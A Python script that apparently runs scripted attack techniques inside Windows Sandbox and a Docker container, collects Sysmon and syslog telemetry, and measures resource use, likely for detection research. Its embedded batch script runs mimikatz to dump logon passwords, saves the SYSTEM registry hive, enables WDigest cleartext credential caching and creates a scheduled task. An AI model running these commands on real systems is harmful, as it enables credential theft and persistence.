import os
import subprocess
import time
import threading
import docker
import psutil

def prepared():
    
    cur_dir = os.path.dirname(os.path.abspath(__file__))
    project_root = os.path.abspath(os.path.join(cur_dir, '..'))
    src_dir = os.path.join(project_root, 'src')
    
    sandbox_files_dir = os.path.join(src_dir, "SandboxFiles")
    sandbox_config_path = os.path.join(sandbox_files_dir, "sandbox.wsb")
    install_script_path = os.path.join(sandbox_files_dir, "install_and_run.bat")
    sysmon_exe_path = os.path.join(sandbox_files_dir, "Sysmon64.exe")
    sysmon_config_path = os.path.join(sandbox_files_dir, "sysmonconfig.xml")

    # 确保文件夹存在
    os.makedirs(sandbox_files_dir, exist_ok=True)
    
    return (sandbox_files_dir,sandbox_config_path,install_script_path,sysmon_exe_path,sysmon_config_path)

def write_script(install_script_path,install_script_content):
    if not install_script_path:
        raise ValueError("The install_script_path path is empty.")
    with open(install_script_path, "w") as script_file:
        script_file.write(install_script_content)
    return install_script_content

def write_config(sandbox_config_path,sandbox_config_content):
    if not sandbox_config_path:
        raise ValueError("The sandbox_config_path path is empty.")
    with open(sandbox_config_path, "w") as config_file:
        config_file.write(sandbox_config_content)
    return sandbox_config_content
    
def check_dependency(sandbox_config_path,install_script_path,sysmon_exe_path,sysmon_config_path):    
    if not os.path.exists(sandbox_config_path):
        raise FileNotFoundError("The sandbox_config_path path does not exist")
    if not os.path.exists(install_script_path):
        raise FileNotFoundError("The install_script_path path does not exist")
    if not os.path.exists(sysmon_exe_path):
        raise FileNotFoundError("The sysmon_exe_path path does not exist")
    if not os.path.exists(sysmon_config_path):
        raise FileNotFoundError("The sysmon_config_path path does not exist")
    return True
        
def open_sandbox(sandbox_config_path):
    sandbox_process = subprocess.Popen(['start', '/wait', 'WindowsSandbox.exe', sandbox_config_path], shell=True)
    sandbox_pid = sandbox_process.pid

    # Monitor CPU and memory usage of the sandbox process
    while sandbox_process.poll() is None:
        # Get CPU and memory usage of the sandbox process
        sandbox_cpu_percent = psutil.Process(sandbox_pid).cpu_percent(interval=1)
        sandbox_memory_usage = psutil.Process(sandbox_pid).memory_info().rss / (1024 * 1024)  # Memory usage in MB

        # Print CPU and memory usage
        print(f"Windows Sandbox CPU Usage: {sandbox_cpu_percent}%")
        print(f"Windows Sandbox Memory Usage: {sandbox_memory_usage:.2f} MB")

        # Wait for a short interval before checking again
        time.sleep(1)

def run_sandbox(sandbox_config_path):
    # 启动Windows沙盒
    if (not os.path.exists(sandbox_config_path)) or (not sandbox_config_path.lower().endswith('.wsb')) :
        print(f"Error: The specified sandbox configuration file '{sandbox_config_path}' does not exist.")
        return False
    sandbox_thread = threading.Thread(target=open_sandbox,args=(sandbox_config_path,))
    sandbox_thread.start()    
    sandbox_thread.join() 
    return True

def build_docker_image(dockerfile_path,tag):
    if (not os.path.exists(dockerfile_path)) or ( 'Dockerfile' not in os.listdir(dockerfile_path)):
        print(f"Error: The specified dockerfile '{dockerfile_path}' does not exist.")
        return (None,tag)
    # Initialize Docker client
    client = docker.from_env()

    
    # Create and start a new container with syslog logging
    image, build_logs = client.images.build(path=dockerfile_path, tag=tag)
    for log in build_logs:
        if 'stream' in log:
            print(log['stream'], end='')
    time.sleep(10)
    
    return (image,tag)

def run_docker_container(container_name,image_tag):
    # Initialize Docker client
    client = docker.from_env()
    try:
        existing_container = client.containers.get(container_name)
        print(f"Container {container_name} already exists. Removing it.")
        existing_container.remove(force=True)
    except docker.errors.NotFound:
        print(f"No existing container with name {container_name}.")

    container = client.containers.run(
        image_tag,
        detach=True,
        name=container_name
    )
    return container

def run_docker_command(container,commands):
    outputs=[]
    exit_codes=[]
    for line in commands:
        exit_code, output = container.exec_run(line)
        exit_codes.append(exit_code)
        outputs.append(output)
        if exit_code == 0:
            print(output) 
    return exit_codes,outputs
    
def syslog_output(container,syslog_path):    
    exit_code, output = container.exec_run("cat /var/log/syslog")
    print(output.decode())
        
    with open(syslog_path, 'w') as output_file:
        output_file.write(output.decode())
    return (exit_code, output)

def remove_container(container):
    # Wait for the container to complete
    container.stop()


    # Stop and remove the container
    container.remove()

    print(f"Container {container.id} stopped and removed.")
    
    
    

def windows_attack():
    sandbox_files_dir,sandbox_config_path,install_script_path,sysmon_exe_path,sysmon_config_path = prepared()
    # 创建安装和执行脚本内容
    install_script_content = f"""
    @echo off
    cd %USERPROFILE%\\Desktop
    copy %USERPROFILE%\\Desktop\\SandboxFiles\\Sysmon64.exe .
    copy %USERPROFILE%\\Desktop\\SandboxFiles\\sysmonconfig.xml .
    copy %USERPROFILE%\\Desktop\\SandboxFiles\\mimikatz.exe .
    copy %USERPROFILE%\\Desktop\\SandboxFiles\\1.bat .
    Sysmon64.exe -accepteula -i sysmonconfig.xml
    ping 127.0.0.1 -n 6 > nul
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit

    copy %USERPROFILE%\Desktop\SandboxFiles\sysmonconfig.xml .

    whoami

    xcopy %USERPROFILE%\\Desktop\\SandboxFiles . /H /Y

    reg save HKLM\SYSTEM C:\\system.save

    reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
     
    setlocal enabledelayedexpansion

    :: Get the current time
    for /f "tokens=1-4 delims=:.," %%a in ("%time%") do (
        set /a HH=%%a, MM=%%b, SS=%%c, FF=%%d
    )

    :: Add 10 seconds
    set /a MM+=1
    if !MM! geq 60 (
        set /a MM-=60
        set /a HH+=1
        if !HH! geq 24 set /a HH-=24
    )

    :: Format the time with leading zeros
    if !HH! lss 10 set HH=0!HH!
    if !MM! lss 10 set MM=0!MM!
    echo !HH!:!MM!
    :: Create the scheduled task
    schtasks /create /tn "MyTask" /tr "notepad.exe" /sc once /st !HH!:!MM! /f

    ping 127.0.0.1 -n 71 > nul
    wevtutil qe Microsoft-Windows-Sysmon/Operational /f:xml /e:root > %USERPROFILE%\\Desktop\\SandboxFiles\\log.xml
    shutdown /s /f /t 0
    """

    write_script(install_script_path,install_script_content)




    # 创建沙盒配置文件内容
    sandbox_config_content = f"""
    <Configuration>
        <Networking>Enable</Networking>
        <MappedFolders>
            <MappedFolder>
                <HostFolder>{sandbox_files_dir}</HostFolder>
                <ReadOnly>false</ReadOnly>
            </MappedFolder>
        </MappedFolders>
        <LogonCommand>
            <Command>C:\\Users\\WDAGUtilityAccount\\Desktop\\SandboxFiles\\install_and_run.bat</Command>
        </LogonCommand>
    </Configuration>
    """

    write_config(sandbox_config_path,sandbox_config_content)

    check_dependency(sandbox_config_path,install_script_path,sysmon_exe_path,sysmon_config_path)

    run_sandbox(sandbox_config_path)
    
    

def linux_attack():  
    

    # Define the syslog address
    test_command=["whoami",
                    "echo 'whoami'> tmp",
                    "cp tmp tmp2",
                    "sh < tmp2"]
    # Create and start a new container with syslog logging
    image,tag = build_docker_image(".","slpine-syslog")
    print(type(image))
    container=run_docker_container("slpine-syslog",tag)
    
    print(type(container))
    run_docker_command(container,test_command) 
     
    syslog_output(container,'container_syslog.log')
    stats = container.stats(stream=False)
    remove_container(container)


def performance_test_windows_attack():
    process = psutil.Process(os.getpid())
    cpu_usage_before = process.cpu_percent(interval=1)
    memory_usage_before = process.memory_info().rss
    
    start_time = time.time()
    windows_attack()
    end_time = time.time()
    
    cpu_usage_after = process.cpu_percent(interval=1)
    memory_usage_after = process.memory_info().rss
    print("Windows sandbox:")
    print(f"CPU usage before: {cpu_usage_before}%")
    print(f"CPU usage after: {cpu_usage_after}%")
    print(f"Memory usage before: {memory_usage_before / 1024 ** 2:.2f} MB")
    print(f"Memory usage after: {memory_usage_after / 1024 ** 2:.2f} MB")
    print(f"Execution time: {end_time - start_time:.2f} seconds")


def performance_test_linux_attack():
    process = psutil.Process(os.getpid())
    cpu_usage_before = process.cpu_percent(interval=1)
    memory_usage_before = process.memory_info().rss
    
    start_time = time.time()
    linux_attack()
    end_time = time.time()
    
    cpu_usage_after = process.cpu_percent(interval=1)
    memory_usage_after = process.memory_info().rss
    print("Linux sandbox:")
    print(f"CPU usage before: {cpu_usage_before}%")
    print(f"CPU usage after: {cpu_usage_after}%")
    print(f"Memory usage before: {memory_usage_before / 1024 ** 2:.2f} MB")
    print(f"Memory usage after: {memory_usage_after / 1024 ** 2:.2f} MB")
    print(f"Execution time: {end_time - start_time:.2f} seconds")

#performance_test_windows_attack()
performance_test_linux_attack()
